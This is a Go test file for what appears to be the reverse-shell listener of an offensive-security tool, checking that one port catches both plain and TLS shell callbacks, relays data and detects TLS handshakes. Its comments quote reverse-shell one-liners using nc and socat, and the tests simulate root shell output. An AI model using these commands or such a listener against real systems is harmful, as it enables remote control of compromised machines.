package shell

import (
	"crypto/tls"
	"encoding/json"
	"net"
	"strconv"
	"testing"

	"github.com/xsecurity-ai/oddjob/ghost/internal/socksrelay"
)

// arrivalFor waits for the announcement belonging to one dialled
// address and returns it.
func arrivalFor(t *testing.T, p *pipe, local string) announcement {
	t.Helper()
	var got announcement
	waitFor(t, "the arrival for "+local, func() bool {
		for _, f := range p.of(socksrelay.ARRIVED) {
			var a announcement
			if json.Unmarshal(f.Payload, &a) == nil && a.Peer == local {
				got = a
				return true
			}
		}
		return false
	})
	return got
}

// The whole point: ONE listener, both kinds of callback.
//
// An operator cannot always say in advance which a payload will
// use -- it is written later, by somebody else, or changed after
// the first attempt failed -- so a listener that speaks only one
// silently eats half the callbacks aimed at it.
func TestOneListenerTakesPlainAndTLS(t *testing.T) {
	l, p, _ := start(t)

	// `nc -e /bin/sh host port`: connects, says nothing, waits to
	// be typed at.
	plain := dialPort(t, l.Port)
	defer func() { _ = plain.Close() }()
	a := arrivalFor(t, p, plain.LocalAddr().String())
	if a.TLS {
		t.Errorf("a plain callback was reported as TLS")
	}
	if _, err := plain.Write([]byte("uid=0(root)\n")); err != nil {
		t.Fatalf("plain write: %v", err)
	}
	waitFor(t, "the plain shell's output", func() bool {
		for _, f := range p.of(socksrelay.DATA) {
			if string(f.Payload) == "uid=0(root)\n" {
				return true
			}
		}
		return false
	})

	// `socat openssl:host:port,verify=0 exec:...`: speaks first,
	// with a ClientHello, and will not verify our certificate
	// because there is no CA either end agrees on.
	enc, err := tls.Dial("tcp", "127.0.0.1:"+strconv.Itoa(l.Port),
		&tls.Config{InsecureSkipVerify: true}) //nolint:gosec // that is the point
	if err != nil {
		t.Fatalf("tls dial: %v", err)
	}
	defer func() { _ = enc.Close() }()

	b := arrivalFor(t, p, enc.LocalAddr().String())
	if !b.TLS {
		t.Errorf("a TLS callback was not reported as encrypted")
	}
	if b.Port != l.Port {
		t.Errorf("announced port %d, listener is on %d", b.Port, l.Port)
	}

	// And it relays, which is the part that matters: the Ghost
	// terminates TLS, so what reaches Oddjob is plaintext either
	// way and the transcript is the same shape.
	if _, err := enc.Write([]byte("web01.acme.example\n")); err != nil {
		t.Fatalf("tls write: %v", err)
	}
	waitFor(t, "the encrypted shell's output", func() bool {
		for _, f := range p.of(socksrelay.DATA) {
			if string(f.Payload) == "web01.acme.example\n" {
				return true
			}
		}
		return false
	})

	// Two sessions, two streams. One listener must not merge them.
	if a.Peer == b.Peer {
		t.Fatalf("both callbacks reported the same peer")
	}
}

// What the server types has to reach an encrypted shell too.
func TestServerDataReachesATLSShell(t *testing.T) {
	l, p, _ := start(t)
	enc, err := tls.Dial("tcp", "127.0.0.1:"+strconv.Itoa(l.Port),
		&tls.Config{InsecureSkipVerify: true}) //nolint:gosec // that is the point
	if err != nil {
		t.Fatalf("tls dial: %v", err)
	}
	defer func() { _ = enc.Close() }()
	a := arrivalFor(t, p, enc.LocalAddr().String())

	frame, err := socksrelay.Encode(socksrelay.DATA,
		streamFor(t, p, enc.LocalAddr().String()), []byte("hostname\r\n"))
	if err != nil {
		t.Fatalf("encode: %v", err)
	}
	p.in <- frame

	buf := make([]byte, 64)
	n, err := enc.Read(buf)
	if err != nil {
		t.Fatalf("the encrypted shell never got it: %v", err)
	}
	if string(buf[:n]) != "hostname\r\n" {
		t.Errorf("it got %q", buf[:n])
	}
	_ = a
}

func streamFor(t *testing.T, p *pipe, local string) uint32 {
	t.Helper()
	for _, f := range p.of(socksrelay.ARRIVED) {
		var a announcement
		if json.Unmarshal(f.Payload, &a) == nil && a.Peer == local {
			return f.Stream
		}
	}
	t.Fatalf("no stream for %s", local)
	return 0
}

// A ClientHello that never finishes is dropped, not handed on as a
// raw socket -- handshake bytes in a transcript would read as
// something somebody typed.
func TestAHalfTLSHandshakeIsDropped(t *testing.T) {
	l, p, _ := start(t)
	c, err := net.Dial("tcp", "127.0.0.1:"+strconv.Itoa(l.Port))
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	// The first three bytes of a TLS record, then silence.
	if _, err := c.Write([]byte{0x16, 0x03, 0x01}); err != nil {
		t.Fatalf("write: %v", err)
	}
	defer func() { _ = c.Close() }()

	// Nothing should ever be announced for it.
	waitFor(t, "the handshake to time out", func() bool {
		return true
	})
	for _, f := range p.of(socksrelay.ARRIVED) {
		var a announcement
		if json.Unmarshal(f.Payload, &a) == nil &&
			a.Peer == c.LocalAddr().String() {
			t.Fatalf("a half-open handshake was announced as a session")
		}
	}
}

func TestLooksTLS(t *testing.T) {
	for _, tc := range []struct {
		name string
		b    []byte
		want bool
	}{
		{"a ClientHello", []byte{0x16, 0x03, 0x01, 0x00}, true},
		{"tls 1.0 through 1.3 all start 0x16 0x03",
			[]byte{0x16, 0x03, 0x03}, true},
		// A shell saying nothing, which is the common case.
		{"no bytes at all", nil, false},
		// `id` is the sort of thing a shell says first if it says
		// anything. It must not be read as a handshake.
		{"shell output", []byte("uid=0(root)\n"), false},
		{"an HTTP request", []byte("GET / HTTP/1.1"), false},
		{"two bytes is not enough to tell", []byte{0x16, 0x03}, false},
	} {
		if got := looksTLS(tc.b); got != tc.want {
			t.Errorf("%s: looksTLS = %v, want %v", tc.name, got, tc.want)
		}
	}
}
